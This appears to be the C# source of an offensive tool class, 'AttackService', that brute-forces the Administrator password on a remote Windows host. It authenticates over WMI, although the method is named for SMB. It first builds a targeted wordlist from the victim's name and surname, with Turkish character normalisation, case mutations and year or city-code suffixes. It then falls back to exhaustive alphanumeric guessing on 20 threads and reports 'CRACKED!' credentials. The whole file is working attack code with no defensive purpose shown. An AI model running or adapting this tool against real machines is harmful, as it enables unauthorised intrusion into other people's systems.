using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CyberTool.Services;

public class AttackService
{
    // Expanded Wordlist for 'Simple' Passwords
    private readonly List<string> _commonUsers = new() 
    { 
        "Administrator", "Admin", "User", "Guest", "Backup", "Test", 
        "Root", "Support", "Manager", "Server", "Pc", "Owner" 
    };
    
    // Top 50 most common passwords + permutations
    private readonly List<string> _commonPass = new() 
    { 
        "123456", "password", "admin", "1234", "qwerty", "admin123", "P@ssw0rd1", "Reset123",
        "12345678", "12345", "123456789", "google", "1", "123", "root", "user", "guest",
        "pass", "admin@123", "Password123", "hello", "letmein", "master", "dragon",
        "baseball", "football", "access", "monkey", "charlie", "mustang", "michael",
        "123321", "654321", "111111", "123123", "admins", "server", "manager",
        "welcome", "welcome1", "1234567", "sunshine", "princess", "solo", "superman",
        "a", "aa", "aaa", "aaaaaa" // Extremely simple ones
    };

    public event Action<string> OnLog;

    public async Task<(bool success, string user, string pass)> BruteForceSmbAsync(string ip, string targetName, string targetSurname, System.Threading.CancellationToken ct)
    {
        Log($"[*] Starting SMART TARGETED ATTACK on {ip}...");
        Log($"[*] Target Profile: {targetName} {targetSurname}");
        Log($"[*] Threads: 20 (Stable) | Target: Administrator");

        var targetUser = "Administrator";
        var options = new ParallelOptions 
        { 
            MaxDegreeOfParallelism = 20, // Reverted to 20 for stability with smart list 
            CancellationToken = ct 
        };

        // Shared state for parallel loop break
        bool found = false;
        string foundPass = null;

        // 1. SMART ATTACK (Parallel)
        Log($"[*] Phase 1: Generated Smart Profile List");
        
        try 
        {
            await Parallel.ForEachAsync(GenerateSmartCombinations(targetName, targetSurname), options, async (pass, token) =>
            {
                if (found) return; // Fast exit

                // Log samples (logging every single one in parallel might flood UI, but user asked for visibility)
                Log($"[?] Trying: {targetUser}:{pass}"); 

                if (await TryAuthAsync(ip, targetUser, pass))
                {
                    found = true;
                    foundPass = pass;
                    // Cancel all other tasks indirectly by setting found
                }
            });
        }
        catch (OperationCanceledException) { Log("[!] Attack Stopped by User."); return (false, null, null); }

        if (found)
        {
            Log($"[+] CRACKED! Credentials found: {targetUser}:{foundPass}");
            return (true, targetUser, foundPass);
        }

        // 2. TRUE BRUTE FORCE (Parallel)
        Log($"[*] Phase 2: True Brute-Force (a-z, 0-9) - Falling back to exhaustive search...");
        var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
        int maxLength = 10; // Extended limit

        try
        {
            long attemptCount = 0;
            await Parallel.ForEachAsync(GenerateIncrementalCombinations(charset, maxLength), options, async (pass, token) =>
            {
                if (found) return;

                // Log every 100th attempt to show progress without freezing UI
                var count = Interlocked.Increment(ref attemptCount);
                if (count % 50 == 0) 
                {
                    Log($"[?] Trying (Brute): {targetUser}:{pass} (Speed: {count} attempts)");
                }

                if (await TryAuthAsync(ip, targetUser, pass))
                {
                    found = true;
                    foundPass = pass;
                }
            });
        }
        catch (OperationCanceledException) { Log("[!] Attack Stopped by User."); return (false, null, null); }

        if (found)
        {
             Log($"[+] CRACKED! Credentials found: {targetUser}:{foundPass}");
             return (true, targetUser, foundPass);
        }

        Log("[-] Attack finished. No valid credentials found.");
        return (false, null, null);
    }

    private IEnumerable<string> GenerateSmartCombinations(string name, string surname)
    {
        var baseWords = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        
        bool hasProfile = !string.IsNullOrWhiteSpace(name) || !string.IsNullOrWhiteSpace(surname);

        if (hasProfile)
        {
            // STRICT MODE: Use ONLY profile data if provided
            // Add Target Profile Info (With & Without Turkish Chars)
            if (!string.IsNullOrWhiteSpace(name))
            {
                var cleanName = NormalizeTurkish(name);
                baseWords.Add(name); 
                baseWords.Add(cleanName);
            }
            if (!string.IsNullOrWhiteSpace(surname))
            {
                var cleanSurname = NormalizeTurkish(surname);
                baseWords.Add(surname);
                baseWords.Add(cleanSurname);
            }
            
            // Combine Name + Surname Patterns
            if (!string.IsNullOrWhiteSpace(name) && !string.IsNullOrWhiteSpace(surname))
            {
                var n = NormalizeTurkish(name);
                var s = NormalizeTurkish(surname);
                
                // JohnDoe, DoeJohn, John.Doe, john_doe
                baseWords.Add(n + s);
                baseWords.Add(s + n);
                baseWords.Add(n + "." + s);
                baseWords.Add(s + "." + n);
                baseWords.Add(n + "_" + s);
                baseWords.Add(n + "@" + s);
            }
        }
        else
        {
            // GENERIC MODE: Default words if no profile
            baseWords.UnionWith(new[] 
            { 
                "123456", "password", "admin", "root", "user", "test", "system", 
                "support", "cyber", "server", "pc", "bilgisayar", "yonetici", 
                "istanbul", "ankara", "turkiye", "galatasaray", "fenerbahce", "besiktas", 
                "trabzon", "1905", "1907", "1903", "1967", "2023", "2024", "2025"
            });
        }

        // 2. Common Suffixes/Patterns
        var suffixes = new List<string> 
        { 
            "", "1", "12", "123", "1234", "12345", "123456",
            "!", ".", "?", "*", "!!", "...",
            "2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025", "2026",
            "06", "34", "35", "55", "61", "01" // Common city codes
        };

        foreach (var word in baseWords)
        {
            // Case Mutations: word, Word, WORD
            var mutations = new List<string> { word.ToLower(), char.ToUpper(word[0]) + word.Substring(1).ToLower(), word.ToUpper() };
            
            foreach (var baseWord in mutations)
            {
                foreach (var suffix in suffixes)
                {
                    yield return baseWord + suffix;
                    yield return baseWord + "." + suffix;
                    yield return baseWord + "!" + suffix;
                    yield return baseWord + "_" + suffix; // New separator
                }
            }
        }
    }

    private string NormalizeTurkish(string text)
    {
        return text.Replace('ğ', 'g').Replace('Ğ', 'G')
                   .Replace('ü', 'u').Replace('Ü', 'U')
                   .Replace('ş', 's').Replace('Ş', 'S')
                   .Replace('ı', 'i').Replace('İ', 'I')
                   .Replace('ö', 'o').Replace('Ö', 'O')
                   .Replace('ç', 'c').Replace('Ç', 'C');
    }

    private IEnumerable<string> GenerateIncrementalCombinations(string charset, int maxLength)
    {
        for (int length = 1; length <= maxLength; length++)
        {
            foreach (var combination in GenerateCombinationsRecursive(charset, length, ""))
            {
                yield return combination;
            }
        }
    }

    private IEnumerable<string> GenerateCombinationsRecursive(string charset, int length, string current)
    {
        if (current.Length == length)
        {
            yield return current;
            yield break;
        }

        foreach (char c in charset)
        {
            foreach (var combination in GenerateCombinationsRecursive(charset, length, current + c))
            {
                yield return combination;
            }
        }
    }

    private async Task<bool> TryAuthAsync(string ip, string user, string pass)
    {
        return await Task.Run(() => 
        {
            try
            {
                var options = new ConnectionOptions
                {
                    Username = user,
                    Password = pass,
                    Impersonation = ImpersonationLevel.Impersonate,
                    Authentication = AuthenticationLevel.PacketPrivacy,
                    Timeout = TimeSpan.FromSeconds(2) // Fast fail
                };

                var scope = new ManagementScope($"\\\\{ip}\\root\\cimv2", options);
                scope.Connect();
                
                // If we get here, auth worked
                return scope.IsConnected;
            }
            catch (UnauthorizedAccessException)
            {
                return false;
            }
            catch (Exception ex)
            {
                // RPC server unavailable etc.
                if (!ex.Message.Contains("Access is denied"))
                    Log($"[!] Error: {ex.Message}");
                return false;
            }
        });
    }

    private void Log(string msg)
    {
        OnLog?.Invoke($"[{DateTime.Now:HH:mm:ss}] {msg}");
    }
}
